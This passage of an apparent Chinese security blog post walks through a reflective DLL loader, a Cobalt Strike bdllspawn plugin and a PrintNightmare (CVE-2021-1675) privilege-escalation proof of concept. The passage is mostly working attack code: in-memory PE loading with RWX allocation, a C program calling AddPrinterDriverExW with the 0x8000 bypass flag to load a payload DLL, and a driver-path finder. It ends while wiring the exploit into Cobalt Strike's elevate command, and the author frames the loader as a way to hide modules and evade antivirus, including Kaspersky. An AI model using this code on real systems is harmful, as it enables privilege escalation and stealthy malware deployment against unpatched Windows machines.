+        <span class="k">if</span><span class="p">(</span> <span class="n">pLoadLibraryA</span> <span class="o">&amp;&amp;</span> <span class="n">pGetProcAddress</span> <span class="o">&amp;&amp;</span> <span class="n">pVirtualAlloc</span> <span class="o">&amp;&amp;</span> <span class="n">pNtFlushInstructionCache</span> <span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="c1">// get the next entry</span>
+        <span class="n">uiValueA</span> <span class="o">=</span> <span class="n">DEREF</span><span class="p">(</span> <span class="n">uiValueA</span> <span class="p">);</span>
+    <span class="p">}</span>
+</pre></div>
+<p>目的是最终获取到下面4个函数，用于在内存展开DLL和刷新指令。</p>
+<pre><code>pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache</code></pre>
+<p>接下来重新分配一个新的空间，大小为PE中设置的内存展开大小,直接复制PE头到新空间。</p>
+<pre><code>// STEP 2: load our image into a new permanent location in memory...
+
+    // get the VA of the NT Header for the PE to be loaded
+    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;
+
+    // allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
+    // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
+    // 重新分配内存镜像大小的空间
+    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
+    // PE头部大小 
+    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfHeaders;
+    // 未展开的DLL文件地址
+    uiValueB = uiLibraryAddress;
+    // 需要存放展开的DLL内存镜像地址
+    uiValueC = uiBaseAddress;
+
+    while( uiValueA-- )
+        // 直接复制PE头到需要展开DLL的内存空间
+        *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;</code></pre>
+<p>复制所有区段</p>
+<pre><code>// STEP 3: load in all of our sections...
+
+    // uiValueA = the VA of the first section
+    // section区域在OptionHeader之后
+    uiValueA = ( (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.SizeOfOptionalHeader );
+
+    // itterate through all sections, loading them into memory.
+    // 获取区段数目
+    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;
+    while( uiValueE-- )
+    {
+        // uiValueB is the VA for this section
+        uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress );
+
+        // uiValueC if the VA for this sections data
+        uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;PointerToRawData );
+
+        // copy the section over
+        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;SizeOfRawData;
+
+        while( uiValueD-- )
+            *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
+
+        // get the VA of the next section
+        uiValueA += sizeof( IMAGE_SECTION_HEADER );
+    }</code></pre>
+<p>解析导入表,根据PE中IAT和INT来完成地址修正。</p>
+<pre><code>// itterate through all imports
+    while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name )
+    {
+        // use LoadLibraryA to load the imported module into memory
+        // 利用LoadLibrary API加载进内存 返回到地址
+        uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name ) );
+
+        // uiValueD = VA of the OriginalFirstThunk
+        //INT导入表地址
+        uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;OriginalFirstThunk );
+
+        // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
+        // IAT导入表地址
+        uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;FirstThunk );
+
+        // itterate through all imported functions, importing by ordinal if no name present
+        while( DEREF(uiValueA) )
+        {
+            // sanity check uiValueD as some compilers only import by FirstThunk
+            // 根据INT序号进行导入
+            if( uiValueD &amp;&amp; ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG )
+            {
+                // get the VA of the modules NT Header
+                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;
+
+                // uiNameArray = the address of the modules export directory entry
+                uiNameArray = (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
+
+                // get the VA of the export directory
+                uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress );
+
+                // get the VA for the array of addresses
+                uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );
+
+                // use the import ordinal (- export ordinal base) as an index into the array of addresses
+                uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;Base ) * sizeof(DWORD) );
+
+                // patch in the address for this imported function
+                // 填写IAT地址
+                DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
+            }
+            else
+            {
+                // 根据名称导入
+                // get the VA of this functions import by name struct
+                uiValueB = ( uiBaseAddress + DEREF(uiValueA) );
+
+                // use GetProcAddress and patch in the address for this imported function
+                // 通过pGetProcAddress 修正IAT
+                DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-&gt;Name );
+            }
+            // get the next imported function
+            uiValueA += sizeof( ULONG_PTR );
+            if( uiValueD )
+                uiValueD += sizeof( ULONG_PTR );
+        }
+
+        // get the next import
+        uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
+    }</code></pre>
+<p>修正重定位表，正常来说像exe等可执行文件，32寻址可占据4g=2^2 <em> 2^10 </em> 2^10 * 2^10<br/>
+64位则高达2^34g，不过实际上用户空间32位只有2g,64位为8TB。(实际物理内存跟系统支持有关，这里是虚拟空间内存)，然后每个程序都可以独享一个这样的内存空间，随意分配地址。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215413-1756a022-0b2c-1.png"/></p>
+<p>程序编译时每个模块都有由链接器给出优先加载地址ImageBase，链接器生成的指令地址是在这个基础上的，对于EXE程序，拥有自己独立空间，不会被占用，而DLL动态链接库载入的地址可能被调用的应用程序占据，此时则需要进行重定位，DLL内部考虑这种情况，自身维护了一个重定位表。</p>
+<pre><code>// STEP 5: process all of our images relocations...
+
+    // calculate the base address delta and perform relocations (even if we load at desired image base)
+    // 获取到默认载入基址与真实载入地址差值
+    uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;
+
+    // uiValueB = the address of the relocation directory
+    // 获取到重定位目录地址
+    uiValueB = (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
+
+    // check if their are any relocations present
+    if( ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size )
+    {
+        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
+        // 获取重定位表地址
+        uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );
+
+        // and we itterate through all entries...
+        // 区块大小
+        while( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock )
+        {
+            // uiValueA = the VA for this relocation block
+            uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress );
+
+            // uiValueB = number of entries in this relocation block
+            // SizeOfBlock = IMAGE_BASE_RELOCATION + TypeOffset 从而获取到relocation block的数目
+            uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
+
+            // uiValueD is now the first entry in the current relocation block
+            // 第一个项
+            uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
+
+            // we itterate through all the entries in the current block...
+            while( uiValueB-- )
+            {
+                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
+                // we dont use a switch statement to avoid the compiler building a jump table
+                // which would not be very position independent!
+                // 根据类型来进行偏移修正
+                if( ((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_DIR64 )
+                    *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += uiLibraryAddress;
+                else if( ((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGHLOW )
+                    *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += (DWORD)uiLibraryAddress;
+
+                else if( ((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGH )
+                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += HIWORD(uiLibraryAddress);
+                else if( ((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_LOW )
+                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += LOWORD(uiLibraryAddress);
+
+                // get the next entry in the current relocation block
+                uiValueD += sizeof( IMAGE_RELOC );
+            }
+
+            // get the next entry in the relocation directory
+            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock;
+        }
+    }</code></pre>
+<p>最后则是获取DLL的入口地址，去正常执行。</p>
+<pre><code>// STEP 6: call our images entry point
+
+    // uiValueA = the VA of our newly loaded DLL/EXE's entry point
+    // 获取入口地址
+    uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );
+
+    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
+    // 刷新指令来应用我们重定位过后的指令
+    pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
+
+    // call our respective entry point, fudging our hInstance value
+#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+    // if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
+    ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
+#else
+    // if we are injecting an DLL via a stub we call DllMain with no parameter
+    ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
+#endif
+
+    // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
+    return uiValueA;</code></pre>
+<p>默认项目里面的预处理器定义了<code>REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</code>,最终就会带上参数去执行DLLMain，其实这里设计有些许冗余，stub部分其实也被兼容的了。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215441-277ede92-0b2c-1.png"/></p>
+<h3 data-content="1" id="592d3fbdfe7295aadba7cc41236f4934">0x2.3 小结</h3>
+<p>DLL反射加载技术是一种内存层面的自加载技术，理解起来还是比较容易的，但是实现过程需要大量的debug，所以很感谢前人所做的努力。</p>
+<p>相比于常规的DLL注入，DLL反射加载注入，能够有效地实现隐藏模块进而躲避AV的作用，但是同样可以观察到，只要能够对<code>VirtualAlloc</code>进行用户层Hook，依然可以获取到完整的DLL进行特征匹配查杀，点到这里，那么过卡巴斯基的路子不言而喻。</p>
+<h2 data-content="1" id="dbb9f6626d4f8ab530b4ab0b9a334cc6">0x3 Cobalt Strike 反射注入插件</h2>
+<p>众所周知，Cobalt Strike的核心beacon.dll也是通过DLL反射进行加载的，身边有大佬已经对beacon.dll进行重写了，然后CS的一些扩展功能，比如键盘记录DLL，同样也是传递DLL进行反射加载调用的，也就是说Cobalt Strike本身就内置了一个类似DLL反射加载注入器的模块。</p>
+<p>得益于CS的高度自定义，其插件功能开放了这个模块的调用:<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn" target="_blank">bdllspawn</a><br/>
+文档说明如下:</p>
+<blockquote>
+<p>Spawn a Reflective DLL as a Beacon post-exploitation job.<br/>
+Arguments<br/>
+$1 - the id for the beacon. This may be an array or a single ID.<br/>
+$2 - the local path to the Reflective DLL<br/>
+$3 - a parameter to pass to the DLL<br/>
+$4 - a short description of this post exploitation job (shows up in jobs output)<br/>
+$5 - how long to block and wait for output (specified in milliseconds)</p>
+</blockquote>
+<p>Note部分还介绍了这个功能会自动根据DLL的类型来派生对应的进程，需要在<code>DLL_PROCESS_ATTACH</code>case处编写代码，支持传入一个char指针类型的参数，然后输入输出使用STDOUT，用<code>fflush(stdout)</code>进行输出，关闭进程退出则使用<code>ExitProcess(0)</code>。</p>
+<h3 data-content="1" id="b610e50e2f677835674cf1e225183110">0x3.1 Demo插件编写</h3>
+<p>下载其他人的Example:<br/>
+Stephen Fewer's Reflective DLL Injection Project</p>
+<pre><code>curl https://github.com/rxwx/cs-rdll-ipc-example/archive/refs/heads/main.zip -o main.zip</code></pre>
+<p>用visual stdio 2019打开,替换DLLMain.cpp为如下内容:</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include "ReflectiveLoader.h"
+
+extern HINSTANCE hAppInstance;
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+    BOOL bReturnValue = TRUE;
+    switch (dwReason)
+    {
+    case DLL_QUERY_HMODULE:
+        if (lpReserved != NULL)
+            *(HMODULE*)lpReserved = hAppInstance;
+    case DLL_PROCESS_ATTACH:
+        hAppInstance = hinstDLL;
+        /* print some output to the operator */
+        if (lpReserved != NULL) {
+            printf("Hello from test.dll. Parameter is '%s'\n", (char*)lpReserved);
+        }
+        else {
+            printf("Hello from test.dll. There is no parameter\n");
+        }
+        MessageBoxA(NULL, "Hello from beacon.exe", "Box", MB_OK);
+
+        /* flush STDOUT */
+        fflush(stdout);
+
+        /* we're done, so let's exit */
+        ExitProcess(0);
+        break;
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return bReturnValue;
+}</code></pre>
+<p>主要是注释了原来的功能，引用官方编写的更为简单直观地功能，主要是进行参数的输出，类似hellworld，选择release 64位编译DLL:<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215517-3d3a2192-0b2c-1.png"/><br/>
+然后我们编写个简单的cna插件:</p>
+<pre><code>alias hello {
+    bdllspawn($1, script_resource("bin/ReflectiveDll.x64.dll"), $2, "test dll", 5000, false);
+}</code></pre>
+<p>打包起来:<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215538-49823e08-0b2c-1.png"/><br/>
+加载执行效果如下:<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215549-507a30a8-0b2c-1.png"/><br/>
+到此，我们已经能够在Cobalt Strike实现简单的DLL反射加载。</p>
+<h2 data-content="1" id="79547c214db59658ccdd001289604fe0">0x4 Printnightmare LPE 简析</h2>
+<p>当时选用Printnightmare作为提权，就想着了解下它的历史。<br/>
+下面是自己根据收集的资料进行推断分析，担心起到误导作用，本节建议跳过不看，也欢迎师傅看过之后找我一起交流，尝试弄个1day的exp。</p>
+<h3 data-content="1" id="08b0c0007ee398da6651b33c4708d947">0X4.1 CVE-2021-1675</h3>
+<p>CVE-2021-1675-LPE 之所以能够成为我的选择，取决:<br/>
+1.时效性强<br/>
+2.利用简单(这个很重要)<br/>
+3.全版本通杀<br/>
+其中第三点<br/>
+window server 从2008通杀到2009<br/>
+window 从win7通杀到win10<br/>
+<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675" target="_blank">Windows Print Spooler Remote Code Execution Vulnerability</a><br/>
+这个洞本质是权限绕过,通过spoolsv.exe进程在RpcAddPrinterDriverEx接口传入第三个未在官方文档提及的flag参数0x00008000即可绕过权限验证。<br/>
+函数说明: <a href="https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex" target="_blank">AddPrinterDriverEx function</a></p>
+<blockquote>
+<p>AddPrinterDriverEx 函数安装本地或远程打印机驱动程序并链接配置、数据和驱动程序文件</p>
+</blockquote>
+<p>漏洞利用过程，则是低权限用户可将一个恶意的DLL文件作为驱动程序被加载。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215607-5b09e1ee-0b2c-1.png"/></p>
+<blockquote>
+<p>虽然现在笔者用window，但是没有配ida，这里就没有过多去验证，主要是参考别人的成果。不过有趣的是，我查阅了<code>spoolsv.exe</code>很多历史漏洞，其中添加驱动爆出过多次问题，虽然具体成因不太一样。printnightmare这个洞利用手法并不复杂，属于逻辑问题，难一点的层面是逆向出整个流程，有时候发现洞并不意味着你理解洞的成因。</p>
+</blockquote>
+<p>故为了避免误人子弟，这里主要从利用角度来说明EXP的实现代码</p>
+<blockquote>
+<p><a href="https://paper.seebug.org/1632/#internaladdprinterdriverex" target="_blank">Windows Print Spooler 服务最新漏洞 CVE-2021-34527 详细分析</a><br/>
+这篇文章展示EXP利用+调试过程，很好地说明了EXP参数的选用原因。</p>
+</blockquote>
+<p>自写简单POC:</p>
+<pre><code>// LPE-Demo.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
+//
+
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// uncidoe 
+int wmain(int argc, wchar_t* argv[])
+{
+    WCHAR payloadPath[MAX_PATH] = { 0 };
+    WCHAR driverPath[MAX_PATH] = { 0 };
+
+    if (argc &lt; 2) {
+        printf("[*] Usage: LPE-Demo.exe driverPath payloadPath");
+        exit(0);
+    }
+    wsprintf(driverPath, L"%s", argv[1]);
+    wsprintf(payloadPath, L"%s", argv[2]);
+
+    printf("\n");
+    printf("driverPath: %ls\n", driverPath);
+    printf("payloadPath: %ls\n", payloadPath);
+
+    DRIVER_INFO_2 driverInfo;
+    driverInfo.cVersion = 3;
+    driverInfo.pDriverPath = driverPath;
+    driverInfo.pDataFile = payloadPath;
+    driverInfo.pConfigFile = payloadPath;
+    driverInfo.pEnvironment = NULL;
+    driverInfo.pName = (LPWSTR)L"demo";
+
+    DWORD addPrinter = AddPrinterDriverExW(NULL, 2, (PBYTE)&amp;driverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);
+    if (addPrinter != 0) {
+        printf("[*] Success Done!\n");
+    }
+    else {
+        printf("[-] GetLastError: %d\n", GetLastError());
+    }
+}</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215633-6a8abeb8-0b2c-1.png"/></p>
+<p>这里驱动路径要自己找个有效的打印机驱动，我这里用了系统自带的UNIDRV.DLL，这个文件在哪里获取，下面有说。</p>
+<p>因为每个系统的UNIDRV存放文件路径不一致，Twiter和github有不少师傅分享了自动获取UNIDRV.DLL的<a href="https://gist.github.com/hlldz/6248cac6a719d0e2094be70a4261e18a" target="_blank">路径方法</a>，做到了exp适配多个版本系统，因为影响的系统的<code>spoolsv.exe</code>大都是在64-bit运行的，所以你的payload.dll要对应到64位)。</p>
+<div class="highlight"><pre><span></span><span class="kt">wchar_t</span><span class="o">*</span> <span class="nf">findDLLPath</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="kt">wchar_t</span> <span class="n">targetDLLPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+    <span class="n">DWORD</span> <span class="n">dwNeeded</span><span class="p">;</span>
+    <span class="n">LPBYTE</span> <span class="n">lpDriverInfo</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwReturned</span><span class="p">;</span>
+    <span class="n">DRIVER_INFO_2</span><span class="o">*</span> <span class="n">pInfo</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">EnumPrinterDriversW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReturned</span><span class="p">);</span>
+
+    <span class="n">lpDriverInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">dwNeeded</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">lpDriverInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="p">}</span>
+
+    <span class="n">EnumPrinterDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">lpDriverInfo</span><span class="p">,</span> <span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReturned</span><span class="p">);</span>
+
+    <span class="n">pInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">DRIVER_INFO_2</span><span class="o">*</span><span class="p">)</span><span class="n">lpDriverInfo</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwReturned</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">pInfo</span><span class="o">-&gt;</span><span class="n">pDriverPath</span><span class="p">,</span> <span class="sa">L</span><span class="s">"ntprint.inf_amd64"</span><span class="p">))</span> <span class="p">{</span>
+
+            <span class="kt">wchar_t</span> <span class="n">tempDrive1</span><span class="p">[</span><span class="n">_MAX_DRIVE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempDirectory1</span><span class="p">[</span><span class="n">_MAX_DIR</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempFileName1</span><span class="p">[</span><span class="n">_MAX_FNAME</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+            <span class="kt">wchar_t</span> <span class="n">tempFileExtension1</span><span class="p">[</span><span class="n">_MAX_EXT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+            <span class="n">_wsplitpath_s</span><span class="p">(</span><span class="n">pInfo</span><span class="o">-&gt;</span><span class="n">pDriverPath</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempDrive1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_DRIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempDirectory1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_DIR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempFileName1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_FNAME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tempFileExtension1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">_MAX_EXT</span><span class="p">);</span>
+
+            <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">targetDLLName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"UNIDRV.DLL"</span><span class="p">;</span>
+
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempDrive1</span><span class="p">);</span>
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">tempDirectory1</span><span class="p">);</span>
+            <span class="n">wcscat_s</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">targetDLLName</span><span class="p">);</span>
+
+            <span class="c1">// 这个需要参考</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">fileExists</span><span class="p">(</span><span class="n">targetDLLPath</span><span class="p">))</span> <span class="p">{</span>
+
+                <span class="n">LocalFree</span><span class="p">(</span><span class="n">lpDriverInfo</span><span class="p">);</span>
+
+                <span class="k">return</span> <span class="n">targetDLLPath</span><span class="p">;</span>
+
+            <span class="p">}</span>
+
+        <span class="p">}</span>
+
+        <span class="n">pInfo</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">LocalFree</span><span class="p">(</span><span class="n">lpDriverInfo</span><span class="p">);</span>
+
+<span class="p">}</span>
+</pre></div>
+<h3 data-content="1" id="d6345f18b2c0e5b2e26da4990aa1ca03">0x4.2 CVE-2021-34527</h3>
+<p>了解这个洞，能够使笔者对printnight有更深的认识。</p>
+<p>CVE-2021-1675 漏洞点发生在<code>RpcAddPrinterDriver</code><br/>
+但是观察上面的POC可以发现，我们是通过<code>AddPrinterDriverExW</code>来调用<br/>
+我们细读文档,函数的第一个参数:</p>
+<blockquote>
+<p>pName<br/>
+A pointer to a null-terminated string that specifies the name of the server on which the driver should be installed. If this parameter is NULL, the function installs the driver on the local computer.<br/>
+可以发现这里可以指定一个server的名称，为空的话，则代表安装到本地<br/>
+根据腾讯给出的公告，1675调用的漏洞链是:AddPrinterDriverExW-&gt;RpcAddPrinterDriver，但是这个过程没给出具体分析。</p>
+</blockquote>
+<p>网上很多文章都说CVE-2021-34527漏洞点发生在<code>RpcAsyncAddPrinterDriver</code><br/>
+笔者去查阅了<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" target="_blank">漏洞官方通告</a>并感谢两个大佬(原作者)。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215909-c775c280-0b2c-1.png"/></p>
+<p>然后又去翻<code>Zhiniang Peng (@edwardzpeng) &amp; Xuefeng Li (@lxf02942370)</code>最初发的POC，公布原因：两位大佬以为自己撞洞。<br/>
+<a href="https://github.com/numanturle/PrintNightmare" target="_blank">https://github.com/numanturle/PrintNightmare</a><br/>
+<img src="CS插件之反射DLL加载EXP绕过AV提权.assets/image-20210901214345891-0503827.png"/><br/>
+是不是看完很迷惑，笔者到这里已经自闭，但仍然坚持进行信息检索。</p>
+<p>翻了下twitter的时间线:<br/>
+当时有人测试出了CVE-2021-1675,在DC环境是可以成功的，还有具体的图,说明只是修补了本地的洞。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215658-79338d82-0b2c-1.png"/><br/>
+其中官方信息提到<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675" target="_blank">CVE-2021-1675</a>关于win2019 这个洞的补丁是KB5003646，如图所示，但exp依然打成功了。<br/>
+后继续翻@gentilkiwi的twitter 也发现了很多有趣的探讨和利用，等待后续的深入研究。</p>
+<h3 data-content="1" id="c9563d38af2bf635fee7428ec91eecb9">0x4.3 小结</h3>
+<p>有趣的是，除了这两个CVE-2021-1675、CVE-2021-34527<br/>
+被广泛分析之外，未披露POC的有CVE-2021-34481、CVE-2021-36958，猜测是通过寻找新的<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_dce_rpc_printnightmare_print_driver_install.yml" target="_blank">端点</a>绕过权限验证来RCE。<br/>
+笔者对这个漏洞的前世今生很感兴趣，因为目前环境并不允许，也与本文主题关系不大，所以就此作罢，后面会对这个漏洞进行学习和实操分析，梳理好这个时间线。</p>
+<h2 data-content="1" id="d39b62548651902d55a81a59730e2a7c">0x5 EXP-&gt;CS插件</h2>
+<p>前人的肩膀:<a href="https://github.com/hlldz/CVE-2021-1675-LPE" target="_blank">CVE-2021-1675-LPE</a><br/>
+这里利用的是CVE-2021-1675，直接设置server那么为空，来本地加载驱动。</p>
+<p>目标:<br/>
+1) 可作为提权模块，成为<code>elevate</code>的一个子项<br/>
+2) 添加到命令行，指定加载DLL文件</p>
+<p>部分代码如下:</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">"ReflectiveLoader.h"</span><span class="cp"></span>
+
+<span class="k">extern</span> <span class="n">HINSTANCE</span> <span class="n">hAppInstance</span><span class="p">;</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
